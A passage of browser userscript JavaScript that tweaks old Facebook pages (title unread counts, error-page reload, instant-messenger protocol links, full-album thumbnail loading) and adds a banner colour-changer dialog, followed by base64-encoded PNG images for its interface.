				var count = $('//a[@name="requests"]/span/span', null, true);
				if (count && count.innerHTML>0 && getStyle(count.parentNode,'display')!='none') { counts.push(count.innerHTML + 'f'); }
			}
			if (prefs['InboxCountInTitle']) {
				var count = $('//a[@name="messages"]/span/span', null, true);
				if (count && count.innerHTML>0 && getStyle(count.parentNode,'display')!='none') { counts.push(count.innerHTML + 'm'); }
			}
			if (prefs['NotificationCountInTitle']) {
				var count = $('//a[@name="notifications"]/span/span', null, true);
				if (count && count.innerHTML>0 && getStyle(count.parentNode,'display')!='none') { counts.push(count.innerHTML + 'n'); }
			}
			if (counts.length>0) {
				if (document.title.charAt(0) == '(') { document.title = document.title.replace(/^\(.*?\)/, '(' + counts.join(' ') + ')'); }
				else { document.title = '(' + counts.join(' ') + ') ' + document.title; }
			} else {
				document.title = document.title.replace(/^\(.*?\)/, '');
			}
		}
	} catch(x) { logError('Page Title', x); }

	//
	// Reload Error Page
	//
	if (prefs['ErrorPageReload'] && $('#content') && $('#content').innerHTML.toLowerCase().indexOf('error while loading page from')!=-1 && $('#try_again_button')) {
		tryAgainButton=$('#try_again_button');
		if (tryAgainButton.className.indexOf('autoreload')==-1) {
			tryAgainButton.className = tryAgainButton.className + ' autoreload';
			tryAgainButton.value = $l('ReloadErrorPage');
			setTimeout("if (document.getElementById('try_again_button')) { window.location.reload(); }", 5000);
		}
	}

	//
	// Add Protocol Links
	//
	if (prefs['ProtocolLinks'] && (page.match(/profile\.php\?id=.*&v=info/) || (page.indexOf('.php')==-1 && page.indexOf('/')==-1) && page.indexOf('v=info')!=-1) && $('#info_section_info_contact') && $('#info_section_info_contact').className.indexOf('fbfhandled')==-1) {
		try {
			$('#info_section_info_contact').className = $('#info_section_info_contact').className + ' ' + 'fbfhandled';
			var dds = $('#info_section_info_contact').getElementsByTagName('dd');
			var dts = $('#info_section_info_contact').getElementsByTagName('dt');
			for (var i=0; i<dds.length; i++) {
				if (dts[i].innerHTML == 'Skype:') { dds[i].innerHTML = '<a href="skype:' + dds[i].innerHTML + '?call" title="' + $l('ProtocolSkype', dds[i].innerHTML) + '">' + dds[i].innerHTML + '</a>'; }
				if (dts[i].innerHTML == 'Windows Live:') { dds[i].innerHTML = '<a href="msnim:chat?contact=' + dds[i].innerHTML + '" title="' + $l('ProtocolMSN', dds[i].innerHTML) + '">' + dds[i].innerHTML + '</a>'; }
				if (dts[i].innerHTML == 'Yahoo:') { dds[i].innerHTML = '<a href="ymsgr:sendIM?' + dds[i].innerHTML + '" title="' + $l('ProtocolYahoo', dds[i].innerHTML) + '">' + dds[i].innerHTML + '</a>'; }
				if (dts[i].innerHTML == 'Google Talk:') { dds[i].innerHTML = '<a href="xmpp:' + dds[i].innerHTML + '" title="' + $l('ProtocolGoogle', dds[i].innerHTML) + '">' + dds[i].innerHTML + '</a>'; }
			}
		} catch(x) { logError('Protocol Links', x); }
	}

	//
	// Load thumbnails for entire album
	//
	if (page.match(/^album.php?/)) {
		try {
			var pager = $('.pagerpro')[0];
			if (pager && pager.className.indexOf(' fbfhandled')==-1) {
				pager.id='fbf_photo_pagination';
				pager.className = pager.className + ' fbfhandled';
				if (prefs['AutoLoadFullAlbum']) {
					loadFullAlbum();
				} else {
					var loadAlbumLink = document.createElement('li');
					loadAlbumLink.className = 'pagerpro_li';
					loadAlbumLink.innerHTML = '<a id="FBFLoadAllPhotos" class="pagerpro_a" href="#" onclick="return false;" title="' + $l('LoadPhotosWarning') + '">' + $l('all') + '</a>';
					pager.insertBefore(loadAlbumLink, pager.lastChild.nextSibling);
					onClick('FBFLoadAllPhotos', function(e) {
						setTimeout(function(){ loadFullAlbum(); }, 0);
					});
				}
			}
		} catch(x) { logError('Album Thumbnails', x); }
	}

	//
	// Load thumbnails for tagged photos
	//
	if (page.match(/^profile.php?.*v=photos/) || (page.indexOf('.php')==-1 && page.indexOf('/')==-1 && page.indexOf('v=photos')!=-1)) {
		try {
			var pager = $('.pagerpro')[0];
			if (pager && pager.className.indexOf(' fbfhandled')==-1) {
				pager.id='fbf_photo_pagination';
				pager.className = pager.className + ' fbfhandled';
				if (prefs['AutoLoadTaggedPhotos']) {
					loadTaggedPhotos();
				} else {
					var loadAlbumLink = document.createElement('li');
					loadAlbumLink.className = 'pagerpro_li';
					loadAlbumLink.innerHTML = '<a id="FBFLoadAllPhotos" class="pagerpro_a" href="#" onclick="return false;" title="' + $l('LoadPhotosWarning') + '">' + $l('All') + '</a>';
					pager.insertBefore(loadAlbumLink, pager.lastChild.nextSibling);
					onClick('FBFLoadAllPhotos', function(e) {
						setTimeout(function(){ loadTaggedPhotos(); }, 0);
					});
				}
			}
		} catch(x) { logError('Tagged Photos Thumbnails', x); }
	}

}


}) ();

// There are only 10 types of people in the world - those who understand ternary, those who don't, and those who mistake it for binary :)

var logo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGcAAAAfCAIAAAB1UkQCAAAABnRSTlMAAAAAAABupgeRAAAG0klEQ"+
           "VR4nO1Ya0wUVxQ%2Bs7O7s7AsLC9REAXfr%2FqIIjG20mprTaimWLESaW1tbNWgrdY0aQhVYm2axtQXQdJWo4iKVkOt2BhRfAAK"+
           "LApWEQRXHsLusizsm33Mzk5%2F3GVY2NlxScVf%2B%2F26c%2B53zzn3zLn3nBkAP%2Fzwww8%2F%2FMBeyth39OasKVEhQQQAa"+
           "I3WlHdnjrxXAACffnc%2BWCLKyVo10oZWbsmPDBNLg0S%2Ffp%2F8ajReLWsiSYruh95ofTV6OXHx2uP79Z0dKn1nl36kbV251f"+
           "joqUrdY3r0VPVqNBb8XUsPRq%2B%2B79Wo5kSPrg%2BZM5hG%2FCUxW2tu0%2Fi%2Bis8xlzgnlhnrDNZefZ9G9zqiRpIUGlAUP"+
           "dK27CQlFOAAQDuHYYvHMRdACNDA6XTuPnJ94rjwxNmxHHw%2FAADalTqUvfb%2Bl%2F96oOo2IrtavWWkbdnsDmSrqaXb91XsJ3"+
           "T%2F8bKJ48LCQ0ToEedBSUWzyWLXG6yfrZ5%2F5nJdQIArDR0Op0pjqm%2Fuysv%2B0F3DxsyLSxMnxMWEigOEdpLq0ZnlL7SVd"+
           "e2n938MAOt3nXt7YfzU%2BEiJmLCTlKLbUCZr9SxhOI7l%2F%2FVgfLRUIiZIytmpMlyraHY3tDX70pL5cbHRUkKIW6yONoW2tO"+
           "r58X0fuSvxheOOtJ2Fe7Ytw3k8ALDZHTMnR%2FkYSqh53EGzobNL%2F2VWEUVRQ%2BSkgyqtlDPLj12o6bPYPZcfKbgHAD%2F%2"+
           "FdltvtA6Zcjqd%2F9x5ipYzueYJi5XMzrmBaEUl9e71nSEcu1DDePJSjmeu3a5%2BzjCv3Gr0NWQAIHvEHrWHjcrsnBvetnT41F"+
           "0A4CAcPFmRtrOQNaAMgTtqNE23dPQCwIET5RycAyfKfeQMiVrmwWtOpxNJOrv0KRkFrPFhP6F1DQob6Zg%2FI0ZE8AGApun79Qo"+
           "b6ah9otQbrRW1bYgmwPHxMdKo8CD0iGpuWvJs9EjTUNugeNaqAYDw0MDoUSE9ur6khPgAket035G1XLrREB8btil1ASHkA8DKd6"+
           "Z9A0AD3a%2BBbpB3P5GroyKCFs8bx%2BPxAGB0hAQAkpOmunmrbG7rmTtt9OS4CCRJTpq6wzcOA1RCN69LxDAMOZ9XWF2Uk%2B4"+
           "9tbyAqQak92qwftc5q41EtAa5GgAMJtfpa1PoPPmllXLmbW%2FNvoSE8vYeJNEZLACgUBvQo9YwUA0Yjs3uAIBevaunU6gNiJCS"+
           "UcAIUV%2FpC4fJtYeNymMXahjf7shaOCLD1a%2FxMPbvrdTtp6dMiJQEEgBgsZEURbn0YAAAAj6OaAa2DwmcN6BzT8ayH7YaASA"+
           "0JMDlDT64E3JroUx9dlbfTGYbGhTlpB%2FK1IUGBzCzvnAYjImUpK6YhcZag%2BWPP2Wse3f5yTHHit%2FPV695%2Fw1psMgbga"+
           "Zde8W4ekEAgMgw8RCJQIAPUuUWtiGbZCYwt9eA9XNonzmszsgedeb%2FspbD8%2BFFbfeR61%2BsSfCSgh5uOV%2Bi7ckztcVGY"+
           "m7qzJZBCYW5%2FVxw0uy9u3tPT%2F8PjkpjJIR8lIaL543bmHmRozsZXtQS58Qyeyy9J79b1y7g49s%2FWYQueLRJinJFi7n13U"+
           "E6Bq7Io4VVrL80WG%2BGoEAhGri23b93ghiwIhL2b2dwsnFx%2BtGlMVXWvfhq3UIAEAcKN61JOL7P0wsXhhc1IX%2Fg1NU2KrO"+
           "2Lt3%2B42UmWdA50GjN4kAhAIyPkV4ta2pq1QBAhDRw7JiQKzcbHzerly2ahPg7NiyeM7XabCFxnBcaLBodEdTwXLMtfdGAOQF2"+
           "4ES5zU7NnT4mLkaKhH1WEgC0Bgu6JWJHB5dUNDe2aBbMimFOGSojvnAYiAjB5rTE5Hf0Y6OCASBxTmzWoZK9X783rPgAAHSo9EN"+
           "qaN7ZKqbK2OwOlcZIOgZ6SBSgw6fuemuRDuVXpG4%2FzRRZT6CukrtfQ82we73zBGpifeEM6df25pYyhDaFdtWW%2FGFHTaUZ8B"+
           "5JUjIKmFAyYNrCNoUW0a6WNbE6mnumEgCyc254CxyKGvOnyBNPW7rX7jgLAB9sPln%2BoJVDiY8cRoKaZxj8XVRY%2FJA1Mlwnt"+
           "L6pSy7qBberqignPVB0bvXymTMmjcIxTK01y%2F7toJx0UkI8ALxQun4irnhrStahkiUL4mKiQkQE3%2BGgtEZrh0pf16AEgN0Z"+
           "y%2BTt55e%2FOXn6xFFSiYjHw%2BwkZTTbujQm1CUdv1AzfWJkZFiQREwQQhwALDZS02uuqVfcqn5enLcBAIrzNhTnwd7c0oWzY"+
           "6MjJQTBt1jJTrWhXNby07crkBu%2BcMpqWnGcBwDqXhOS5J6t%2BjxlPo%2BHAUCw91bBDz%2F88MMPP%2Fzw4zXhP4xva6the9"+
           "vrAAAAAElFTkSuQmCC";     

function submit() {
  node = document.getElementById("Rui Fujiwara");
  setup = {colour1:node.getElementsByTagName("input")[0].value,
           colour2:node.getElementsByTagName("input")[1].value};
  GM_setValue("setup", uneval(setup));
  window.clearInterval(inter);
  node.parentNode.removeChild(node);
}

function cancel() {
  node = document.getElementById("Rui Fujiwara");
  addStyle(eval(GM_getValue("setup",'({colour1:"#3b5998", colour2:"#6d84b4"})')));
  window.clearInterval(inter);
  node.parentNode.removeChild(node);
}

function setColours() {

  var setup = eval(GM_getValue("setup",'({colour1:"#3b5998", colour2:"#6d84b4"})'));
  if (!setup.colour1 && !setup.colour2)
      setup = eval('({colour1:"#3b5998", colour2:"#6d84b4"})');

  newDiv = document.createElement("div");
  newDiv.setAttribute("id", "Rui Fujiwara");
  newDiv.setAttribute("style", "position: fixed; left: "+((window.innerWidth / 2) - 290)+"px; top: "+((window.innerHeight / 2) - 200)+"px; z-index: 1337; background: #fff; border: 2px solid #000; padding: 3px; width: 577px");
  newDiv.innerHTML += "<center><b><h2>Banner Colour Changer by Rui Fujiwara<h2></b></center>";
  
  table = document.createElement("table");
  
  row0 = document.createElement("tr");
  column01 = document.createElement("td");
  column02 = document.createElement("td");
  column01.innerHTML = "<center>Colour 1</center>";
  column02.innerHTML = "<center>Colour 2</center>";
  row0.appendChild(column01);
  row0.appendChild(column02);
  table.appendChild(row0);
  
  colour1 = document.createElement("input");
  colour1.setAttribute("type", "text");
  colour1.setAttribute("class", "color");
  colour1.setAttribute("value", setup.colour1);
  
  colour2 = document.createElement("input");
  colour2.setAttribute("type", "text");
  colour2.setAttribute("class", "color");
  colour2.setAttribute("value", setup.colour2);
    
  colour1Div = document.createElement("div");
  colour1Div.setAttribute("id", "colour1");
  colour1Div.appendChild(colour1);
  column11 = document.createElement("td");
  column11.appendChild(colour1Div);
    
  colour2Div = document.createElement("div");
  colour2Div.setAttribute("id", "colour2");
  colour2Div.appendChild(colour2);
  column12 = document.createElement("td");
  column12.appendChild(colour2Div);
  
  row1 = document.createElement("tr");
  row1.appendChild(column11);
  row1.appendChild(column12);
  table.appendChild(row1);
  
  newDiv.appendChild(table);
  
  buttonInput = document.createElement("form");
  button1 = document.createElement("input");
  button1.setAttribute("type", "button");
  button1.setAttribute("value", "Cancel");
  button1.addEventListener("click", cancel, false);
  
  button2 = document.createElement("input");
  button2.setAttribute("type", "button");
  button2.setAttribute("value", "Set!");
  button2.addEventListener("click", submit, false);
  
  buttonInput.appendChild(button2);
  buttonInput.appendChild(button1);
  
  anotherDiv = document.createElement("div");
  anotherDiv.setAttribute("style", "float: right");
  anotherDiv.appendChild(buttonInput);
  newDiv.appendChild(anotherDiv);
  
  document.body.appendChild(newDiv);
  
  style = document.getElementsByTagName('head')[0].appendChild(document.createElement('style'));
  style.type = 'text/css';
  oldColour1 = '';
  oldColour2 = '';
  inter = window.setInterval(function (){
    var colour1 = document.getElementById("Rui Fujiwara").getElementsByTagName("input")[0].value;
    var colour2 = document.getElementById("Rui Fujiwara").getElementsByTagName("input")[1].value;
    if(oldColour1 != colour1 || oldColour2 != colour2)
      addStyle({colour1:colour1, colour2:colour2});
    oldColour1 = colour1;
    oldColour2 = colour2;
  },1000);
  
  /** The following code is taken and slightly modified from code by Bob Ippolito <bob@redivi.com>.
   ** See somewhere in the middle of this code for the original and unmodified copyright notice.
   **/
  var CROSSHAIRS_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAVAgMAAADUeU0FAAAACVBMVEUAAPD%2F%2F%2F8AAAAXuLmo"+
     "AAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfWAxYAMBoYReiIAAAAHXRFWHRD"+
     "b21tZW50AENyZWF0ZWQgd2l0aCBUaGUgR0lNUO9kJW4AAAAhSURBVAiZY2RgULvFwMBILrWK4Q8LwzXGUBD1GsajzEwAP%2FoZVv"+
     "c4N8oAAAAASUVORK5CYII%3D";
  var HUE_SLIDER_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAADICAIAAADtOM9PAAAABmJLR0QA%2FwD%2FAP%2BgvaeTAAAA"+
     "CXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1gMXAjE1EbdXmwAAAQlJREFUeNrtmlEOgkAMRBupy%2BL97wqsgnICPtSM7uR5gZ"+
     "fHTBtKzGeIfhmjjFQNnSZywsmeRPdwYp7ICaf%2B3yMcnx7dw%2BlH87SlirQXFWmRXZ9r%2BDk5klYaAYkdgdMJaWYb0T2cmNwT"+
     "UqN7dM8%2Bpy2uqptQRgrV8X6QqqHTRE40gu7RCPYeOeFk1r3CPNE95qk%2Fp12Wk%2Br8zGgy0gKpi0Y4Os3khBNOzBPdw%2BkP"+
     "Sbp5anSP7rnndLmrSIOMpPo7bGQNP6cpyOl9UiEnnOx3hKPTzdBppHs42e%2Fyyjzx9HiP%2BN5NqPr0kUM8VBe16ng%2FSKuh00"+
     "JOH5BmGanRCLqHEyS6hxPzRE44%2BZJeueFsJ8zY3KsAAAAASUVORK5CYII%3D";
  var HUE_SLIDER_ARROWS_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAALCAQAAABfL%2FyJAAAAAmJLR0QA%2F4ePzL8AAAAJcEhZcw"+
     "AACxMAAAsTAQCanBgAAAAHdElNRQfWAxYPFQ14OfqVAAAAnElEQVQoz63Suw2EMAwGYJ9Ss0BaBkCsAYtki6uRmAM2yRwREh0Sgc"+
     "hURj%2FNne5o7oEsV3bx2bJNI7hBBrocGTcjqEW%2FcRQHc4Ew4jj2Wwu6gVDCpzWg%2BhOp1uBTCcId9KzVCCl6FD8SRfQh1Y%2"+
     "FkjSEYuH3mpYP9Qtilm9ntry2cGALBYhCZkH9AcpkGOXfSn0ZhNyqXUvkbnS8%2BAP2Frl9tNFLoAAAAAElFTkSuQmCC";
  var SAT_VAL_SQUARE_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAQAAAAHUWYVAAAAAnNCSVQICFXsRgQAAAAZdEVYdFNvZn"+
     "R3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAsAUlEQVR42u1823IkOXakA0FWVXdLM6Oe1a5GL2u2L2u2%2F%2F99jE1mBAD3cx"+
     "yISFaP9NI21qQimRcWHH47CKpgx8fjvz19v3%2F186%2F47%2FjM13%2BD%2F5LfsvwJyJ%2BA%2FAnIn4D8CYhe4QqQ8tOfWW6%"+
     "2BoiwAKeYdiv6evHQf9MnnVaGflef39vXze31%2Brx%2F18%2Bv%2B9vi%2B7T8%2B3vZv%2B%2Ff9f3782%2F6f%2B%2F%2F7gw"+
     "C5eH35KYaUe5sAZf0brH8vA1eJcBPs9F0BOWAQQD4hOH6yPa8%2Bgfj83%2FsDim3%2F9eN9%2F%2FH43z8%2Bfn8A8n%2B%2FBM"+
     "jFfi9fkKz0GuBqt17Dfi5RfLTIZ5QJICW9Q6FPKcKJ0r%2B3qwbB8b9PZtQTkMaMbf%2F2AORt%2F%2B3j%2BwOOX%2Fb%2F%2FP"+
     "j7%2Fh%2F7%2F3kBECx070VOlbjkt5d3sd%2BxWHoja0VBC4AUgavIaxSC4zmlA3JcNUAOkXoyAw8YPg5mHIB8itX7%2Fi9PQH59"+
     "APL7%2Fr%2F2%2F30JCL4gQE8WlUuGFA8IPMBl%2FQ4f9Lqp4OTFffwMV47AslQYkJ394fh%2Bfj2BGCJVniJ1cOP98d%2BnWP3y"+
     "EKv3%2FV8%2FfpyA%2FG3%2F9%2F0fC0D2l%2FX8hkEX%2FxmT1xQnQPscJg%2FIECXnAIMh9BWWC0GWDnhOLiACUjsgjRmfgGyP"+
     "r98%2BPgF5wwDklwcg%2F%2Fj46%2F73B0duA1IuTX3FiRIASI861T9lsrg8lSGAdwAnOOO5ZYA29wfkzDTkaYjTU6p2ZkY5odi6"+
     "jdfuHW8PGD4B%2BcvJkP94APL7gyMeENwOixecKDYGFJOyyhyufIVirT4BgmjJLEP0Fc4f2tITBOwWHZDmGiRVOACpZOMHIBsD8v"+
     "GObydDfnkA8pf93x4cKVchtkxTVpnLEi4dIOT72CMKZr9BMe9QvD%2FsElZzU8BgBMuRfDchlowbDQKcSeqEpXeNjbyjAfL9BOQz"+
     "8D4AeYbeXx495F%2F3vz4gyYBgIh8CVtknmo%2Bl6yBLn75TmcpkMZ9dwiYoi8rGvkDpqF2BOTF%2BKsygJDX8oj43TxMpDbinWO"+
     "HwjsM9MiDfnwz5949%2F2f%2By%2F20NSJlkLpt4sLBky6kuZ6tISuJUYuxdQZBC6xCpAhNhB0CYuUXZBxeGSDV4tmDm9QnMIVZv"+
     "T35sT4a8PQD5%2FPr%2BkKxvJyCfDPkfD0A%2BOVKSd0xFxhe4Mk9SXnDgTb2Q05TIHydHH8q4woDsboxxfEYQpQHIrhB0IFAEGE"+
     "pSEnCbZNXeOIZ7tOZxBN7AkEcP%2BY5f9r9%2F%2FLZ%2FQnIPEHgBKzu8AFmGTX1hzgKz%2B4MzjMXGpEVg0qyZFyxW3LSHfWPU"+
     "PWEIhmtk7yhn0D2%2BPuzcAPIshvix%2F%2F4A5Lc5ICVlrhR7UzNugdKmItezoYOLMgD6MBOk3Y4xfGjdba1zJa%2F%2FFzqGDk"+
     "AaBCxVI1dhBN3GjMd31MSQh4egecghWe8EyK%2F7J0dKDrEh8ew3UlIIrZcTUqTq9hEtvwTYg1SlLs2Zqf8McfxX%2BqPBxKl3r1"+
     "0DvWtUsfGazfxp5y3uHg3kwRAwQz6L4ees9wd%2B%2F%2FhlBkhJNr4aUahwmd3%2Fod5hkxPLEpIcOWYguEb%2FvcajnRecnFLJ"+
     "O0082vhe4mQKHRDykBh0t715R2lVEAzIp71%2F3xmQT4Z8ewDyt4%2FPvv7bBSBY73cNumXCKWPXe%2FIKGg6WAJf0B5QkWcW4Rg"+
     "kD8RhlAQWgg8AiBZasYiSrnh5SaUhSUNOw5H0nhnxKFhiQT4Z8fwTeX54jlBUgMPa7MPViISyGPVGGkmvwdKlDWgykRUw9dIw9l7"+
     "yQo0CeQQPzYeqHP4TmIeORBywY7nF6CN46IMc4sXtIM3U8m%2FqDG7%2BdgPx1BkiZBV1oykqZCX5%2Fd8nDfLxtmwNSj1AIiBmj"+
     "d9OiS8AdYpVntcMrCp3tHS18DNFHK9fxSB%2BSNDNvcRfEkM%2Bv6JJ1eMg5XDwA%2BfYA5JhplVT6BJDixaoNrcPpRjE%2BM8Ai"+
     "XwgFsyDNXs1V2Q0wVPNKl1AZgyDMaiXmVkpZ45o4sc%2Bbx%2FbkD02t%2BonHWQhx5Ks2MtlwNPUfrRg%2Bv%2F72rIffHy39GK"+
     "EsASmToUay8dWUyXkHjf9mQjSCwDQzQYaB4GHgUeeIIQLT55U0DcicCqFxQIIu9KzjbOjNQ%2FZKKWvDKVm9hxBDBJBvJyA%2FIi"+
     "A2JWmuQjG920xXY67afXIqPONKpxEYuYiWdXAjXxUHCMp8ZrvL7HbnE7%2B6880JvQQ%2BzbyNScZpYD%2F5AM93W8qKPaQB8usJ"+
     "yDFCmQEyFSDLmmtuYNoi5Lyu7IsExdKFLFLEE5GzC9c4PAMyFgHGnAoyHuH%2B0WNvJQ854y4IkMfVN1MMP039De9nXz8A%2BR4B"+
     "8RCY0zfXIniuBC9nplXsdvQRXhPnVEWANpwwpxiZIRxs0SNtvDmhyHVVyUIEpMfdnY%2BkJGWhnYf8%2BHg%2FAXk3gCD2bQsIxd"+
     "6RsiY%2B8aFi1F5hgy2LFCZzWeULdY0CBE7AiBM3D%2FEMeMmiY9k%2BHqnkGsND6vAQjP5xpKwMyCiGD0Ae8BwMeTZ23AEEbhQe"+
     "rBnBonPD5jqHLEp6nhE4AZuneDKF1LszIIi5qkrvyHmKYAmStVHsbUD0w9p99I9PsTpS1kOyoIBsAsjZ2PGZtiaAGE5g5g%2BWG5"+
     "jYtwGAY68cp3pxigORIFnJLeAGhl2snntfbRydE72H7GOi%2BylZlU5AWhU8vr%2FJULGdhDxNHQOQ7WTIs6%2FvDZBPhnxjQIxI"+
     "wQ474E19UvJkyGLiLaxxA25Ky%2BVvz5I1GMLeUYU3o2lw9QP6nAq5k7NkVYKngsaJ%2FfyjNfVNAXma%2BycUDw%2FBdgLyft7q"+
     "cAASGJKyElzvJsOGHf%2BBu3khCEuGoh%2BgQlJSGg4O1sAZd%2FeHfTIWaYxBlKo2NoxVUCogjGQhjhOPwGtMHdsYv%2Fc7Fh8N"+
     "5WRIA%2BS3JyCOITCtAlaUXMdwxo3UMFjIYAYiu70Jh8Yi6TxDe4hhRkHu4o0Xw8BrP4rKQLRuzpLVGnq7Ge5tH6OTfjSFkyEnIM"+
     "8jXLSDqgbIr5eA7DIONFKTjN%2Fs%2FuAZYXjO7GIWmPE50mHrnscjEnCR5lS7ubGt%2F0wmuUiS9TTuqt08eYiYuktZgyHnucjn"+
     "jdYDkHcPSJauaPEy1IBpGeYAVfgSjJrf19t4irRIN%2BogBVxpHGlatXMRTIdP%2FacDiGbnlaSrYnhIMvUxy9pPhpzF8HkrKQ7J"+
     "%2BgTkGKF83qX1fgKCRWba4%2BldONuO53VI9Q7mfFt5wyIFc5LRuIA0uw2SVYQvAlY849i5i3c7l6DL8NRT0NrpeY%2B958%2Fe"+
     "nhb%2FJieF9cmNp6mj3US64WTI2Ud%2BPPv6eaCLb3cAKaEKFmRYSkpSiS%2BIzynh9eITKxsHi1wxklUHXzAGiMlDxsCkDUsQgi"+
     "6fl2P8qU3zkPMEBAtTP2%2F%2FOXrIEX%2B%2FPx1FATmPq14BpCB1DMuFC054z%2FBdo8sbGXZoFQxTlKxeAXe%2Bd6TnKklV6G"+
     "GW%2BdK4EE5Adh24H7I2TP3zPd732ENq7yGHkzAgxy0PDwfBXLKQjkxnpo7UIiYVMKatYvkxyVMBCEiUHR5SSNa0g3dguGk0a%2B"+
     "9iFcaI1ENYsuoJj8Te08wLhqlvx4khzth7pq1v558jHI29MeR5XJUAQUpJM0CQslPnTX6FDD6gyYmKHRBahTN1GYRgIll96SETXD"+
     "AEYXCoAZd6CMLAHeGMsHnIuDEO%2FL3F3vaXIQaQ%2FROSXz4z15cBUTPnrhEYVnLADaYee3ef2qJM4CkpXUnpa4NDFD%2Bt2osx"+
     "9fZ%2FyfQqSBVLVg09pN2JFc5DMFKWA6T19XbC%2FsaAlPidx4mYhNjJ1xBwEY6XELpFZ4izcQeERForWY09lKuEEyPgXjCkS9U5"+
     "y2qSdY4Ty2njBeohb03CDg85Je1bD7%2FHyeEGvuUhMGQFyAkEwh0ghkUTH4nwjJsSgDQilFGhgDUXKWaCdo10dY4TNeYahohUtT"+
     "5SRxuJsbd%2F5ZTVTP3o7d%2BojbSZVmPIjzUg5moGCIFWbsCjO9xbenxOtu9s6kOqQIbdzwLPYNuHJZAiGE0devJRd7k7cc8e0k"+
     "y930K6aw%2FpsRetjTRAvndA5pJl%2FWHs3ZTHjIcEi0dRw4%2BPBgmLnCBwMCl%2FbkgiztHPBNuA3QqXStYARAbuwUN6D4Hc04"+
     "tw5yIUkDbTOgDZnpIVAZmbt4iLadjzirfLXSHziDvhibuKix8hmEgW4jyX%2Fybw%2FKkwpKqpt1t%2BTqk6Y696CHj8%2FgnB8Z"+
     "0AOYfwvbE%2FAfkE5pCsNw%2FI7OvCI%2BZQuCtt35qriC%2FF%2FIwe1TYOCbqQPyKAzVXUxRGbB%2FGCDm2pofem3m2cTL2dhx"+
     "zfz7%2BgOvsIAXIw5Pib3OYlXwAkghJqHkpylHTFNyVAZrdYcSI%2FWoOpG8nS5hGuKg8XIUdRx9QKEZAaRidvF6Zez5A7CuLR1B"+
     "sw54Hu1wA5FzYtbx%2BEyJRpJlLJtjX28u6HDA4xy1Whk8sA8bRx8B9pgnJUY8%2BCIdJDKsZfSY3RSfOSt2DqDEib%2Bh5fWx%2"+
     "F5to9h%2FBIQuR9kNIbRsAHZ0enKQWBsWzLTghNi6to1gCBSRf%2FuSRjUeFPD6CQwZCpZjSFn7AUB0oaLqAGY1kMyIK0efg7jtx"+
     "kgIlIo0kN6yoK0iysIQCfigUUm6HLKQmJI39NYitTJE%2B4aH%2FQ1pixQN%2B%2FAkJkjAaKxFwkQAqb1kHeqh44h2wmIgkCcaH"+
     "3kYumFN1GybNcIS36LE4MZwESsBqDDJTCOZU3QHT0kMySa%2BVSyQD1EPQQtZdUzZbXwS%2BeHNNn6FK0vAJK4FAGZxtvElA8HR4"+
     "Jgz4NDgOZVoNE6dDgCEamzECKnqilDcEOyvgBIFcl63hN%2F3Bx0B5Bh24Ebkpmyh%2FBz2K5N60CZAJQYA%2FYJXwLRl77fURI4"+
     "gQQAlBPn40vJyh5Cpr5JU3%2Ba%2BlEQQbfN7Xo6chcQ2zr6M%2BGyEy10cosUarG09JS5pPyJkCVTl8pH0ytwqkKQrCo%2FreMs"+
     "HXQ3L7yHFDTvMID0gtgkq81%2B38jcZ4DAZaaZOMkEagKBFELEya0yJApYJb9xA0QEwx5Dki5VMN2cs1aMvSc3%2BrQ3jE7qPoB5"+
     "a7cBURt5SlVIWa2HnPfCdy9pDGnmPgFkzLJk13uwCKYC2zVCIZwxZOYhaUhCECTXSHkqDUeyhyRT30YbwRjDS1PvnGiAHE2d%2Fh"+
     "xhpKzOl36XFtrU96yJp5dkQEAnGBGQmVtgJkv8M3GHDmEBcQhhLBLESQSM09Ww84%2FkGaCBe%2BQGAVC6OJ3wEC8qar%2Bh%2Bi"+
     "lcfbjYZ1mdKScgBzM6IG9P7%2Bi3POzCkFPADCDnneyu4KFPcr2puyTlxiAwDMlJaogUWJxax1BO9OaBMN8FnXUMv6Alh2EID9zJ"+
     "1Luj9Nt%2FwLOswj2ETb3Pss4T9p3%2BSBoKyBl%2FLwEZxc6mLH6UBoWYSpbLVpkhMVedzxXR0gEi8UWZcjID2jwwUlZiSEXoId"+
     "jaiSGN3Qv6n3mi3%2BTQi6HE39M7hCGHl9wBxCSpBIjad1505kv%2Fc0zER0u%2BJv4UAfEOQ8azBheAGHRjypqaOoKZ95R18sX0"+
     "kHO4mGZaz4lW9xJiSOdJT1sekGzxMiqUrLQSKfUDhEWW4WLgRBqPjKmVdA2Tq2Bibx6WNA%2BJnsLdPKYsmNg7esgiZR0wbect2M"+
     "SQY%2Bb7fPVZEAkQ1zx4%2BjRb%2BmjnzsbR77HyjEgQaAVk%2BxZuECCcsmLsHaOTQs8JKUu4II6CLaSs%2FjdT6Och0BPDrZk6"+
     "zXyf%2F5%2FlwmSLGXIXkDiDyiaeuwZmkuUZIdeh4A23IKmCmV4h2bk%2BRonKpCxiSOWmDuJL%2BxOd7iHD2slDQOciJ1Pa1Xs7"+
     "rsJIW9rbIyA5R00Aiabu4aGjKLFx2feJN5KrkBjCIoVs38M1qsReBSLGXLqWHlL3zJTmL02yhqkfTb0QBFvoIScsY%2Fb7PKaquA"+
     "Yk1bzEBWVBXGx7VVK%2BUobU%2FdLG1TUQjmcbBOwgCYqQqoQhNMtClQFKhTZ1OTFEK4abANHco9%2FykAE5haufkkRAlnOqBMhS"+
     "pJJbrAFIrqFjRBkVJm6cwIw8NVwCFohJyiIbj5JV%2B6TLSlbzkHGmTl7SiiGdH2Kcjhw18TwluQcIx965qSs8WgU9M9jUMxR11M"+
     "QERJMnx5B4RbF35CgCrRqAnGQ9T0KQeggBUsbN1sfzJWWN2HsO4%2FvtpUOy6gGI4YSWvixno28jw3QhWTcYksVJJrkIWSsE3JLT"+
     "Fe4xZOMj3A6hk6xRE%2Bs%2B0tax96mPLAB5E4aIZF0AEnZ%2FNHXXuxMXFgwZj9PhU%2BCELr2TrNkVT3uVIXylAKVC2LLXaOo6"+
